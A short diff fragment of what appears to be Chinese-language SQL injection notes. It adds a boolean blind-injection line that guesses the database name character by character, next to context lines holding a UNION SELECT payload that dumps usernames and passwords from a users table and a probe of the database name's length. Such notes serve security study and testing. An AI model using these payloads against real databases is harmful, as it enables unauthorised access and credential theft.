@@ -58,7 +58,7 @@ UNION SELECT 1,2,group_concat(id,username,password) from users –+ 查询字段
 and (select length (database())) = '8'
 ```
 3. 获取数据库名称
-
+and (select ord(substring(database(),1,1))) = 97
 
 4. 获取表长度
 5. 获取表名称
